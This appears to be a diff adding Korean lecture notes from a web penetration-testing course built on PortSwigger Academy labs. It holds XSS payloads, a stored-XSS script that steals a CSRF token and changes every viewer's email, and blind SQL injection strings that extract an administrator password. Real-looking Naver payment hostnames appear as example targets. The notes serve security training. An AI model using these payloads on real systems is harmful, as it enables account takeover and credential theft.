@@ -1,0 +1,194 @@
+김준수
+
+SK쉴더스 ICT 취약점진단팀
+
+취약점진단 및 모의해킹
+
+SK대내그룹
+
+WEB / Mobile / IoT / Cloud / SYSTEM 
+
+해당 회사는 연 1회 또는 2회 정보자산에 대하여 취약점점검을 받으십니까??
+
+
+pay.naver.com -> DBMS Oracle
+
+admin.pay.naver.com
+10.202.13.34 -> domain
+
+pays.naver.com
+
+50분 까지 Portswigger 회원 가입 및 Burp Suite Local 설치 진행
+
+Reflected XSS
+피싱 링크
+
+link=>pay.naver.com/vul?param=<script>alert(1)</script>
+
+Stored XSS
+DB = <script>alert(1)</script>
+
+
+서버를 거치지 않는 XSS
+javascript 클라이언트 사이드 언어의 개발 결함
+
+link=>pay.naver.com/vul?param=<script>alert(1)</script>
+
+
+
+
+프록시 설정이 자꾸꺼질때
+	=> 회사 사내망에서 AD와 같은 윈도우 정책을 조직적으로 받을때
+	컴퓨터\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings > 
+		ProxyEnable 1
+	=> 백신 (알약 / v3 ...)
+	프록시를 비활성화 하는 기능
+	=> 브라우저 플러그인 프록시를 제어를 할수 있다 -> 윈도우 프록시
+	=> Burp Suite 지웠다가 다시 한번 설치
+	=> 포트 번호가 중복되진 았았는지 
+
+대안 : -> Open Browser
+
+실습 3번
+reflected XSS 가 실행되지 않는 이유
+태그로 실행 되는것이 아닌 문자열로 출력 됬기 때문에
+<script>alert(1)</script>
+'<script>alert(1)</script>'
+
+<script>
+게시글을 조회하는 모든 사용자의 이메일 주소를 임의로 변경시키게한다.
+</script>
+
+<script>
+var req = new XMLHttpRequest();
+req.addEventListener("load", handleResponse);
+req.open('get','/my-account');
+req.send();
+function handleResponse() {   
+    console.log(`Loaded junshae: ${req.status} ${req.response}`);
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];   
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email');
+    changeReq.send('csrf='+token+'&email=kimjsonso@test.com');
+};
+</script>
+console.log(`Loaded junshae: ${req.status} ${req.response}`);
+
+
+15시 05분
+
+
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+	var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+	var changeReq = new XMLHttpRequest();
+	changeReq.open('post', '/my-account/change-email', true);
+	changeReq.send('csrf='+token+'&email=test1234@test1234.com')
+};
+</script>
+
+
+
+<script>alert(1)</script>
+
+
+
+
+abc12323@naaaver.com / abc@naver.com
+
+CSRF == XSS
+
+CSRF 목적
+
+CSRF 공격 구문이 포함된 게시글을 조회하는 모든 사용자의 이메일 주소를 임의로 변경시키게한다.
+
+
+16시 15분 실습문제 6 문제 풀이
+
+
+
+
+Blind SQL Injection 
+분석을 위한  tracking cookie에 SQL Injection 취약점이 존재한다.
+쿼리 참/거짓을 판별하는 문자열 "Welcome back"
+데이터 베이스 명 : ㅇㅇㅇ
+테이블 명 : users
+컬럼 : username, password
+administrator 의 패스워드를 알아내라
+패스워드는 소문자로만 구성되어 있다.
+
+' AND '1'='1
+=> TrackingId에 SQL Injection 공격이 가능하다. (테스트는 Blind SQL Injection 사용)
+
+' AND (SELECT 'abc' FROM users LIMIT 1)='abc
+=> users라는 테이블에 존재여부를 확인하기 위함
+
+' AND (SELECT 'a' FROM users WHERE username='administrators')='a
+=> users라는 테이블 안에 컬럼명이 username이고 administrator라는 계정이 존재한다.
+
+' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+=> administrator의 패스워드 길이가 2자리 이상이야?
+=> 패스워드는 20자리야
+
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+=> administrator 패스워드 첫번째 자리가 a 이냐?
+=> 패스워드 첫번째 자리는 g
+
+' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
+=> 패스워드 두번째 자리는 y
+
+....... 20번째 자리
+gy~~~~~~~~~~~~~~~~~~
+
+패스워드 해시화 저장 
+
+SQL map
+
+blind sql injection
+
+error based sql injection 
+
+union ~~~
+
+
+실무에서의 취약점진단 
+-> 모의해킹과 비교
+
+Burp Suite 도구 사용법 설명
+PortSwigger Academy 실습 사이트 Web Application 취약점진단을 수행
+
+XSS (4)
+	Stored XSS
+	Dom-Based XSS
+	Reflected XSS
+	CSRF
+
+Sql injection (2)
+	인증 우회 (or 1=1--)
+	admin 패스워드 획득 (blind SQL Injection)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
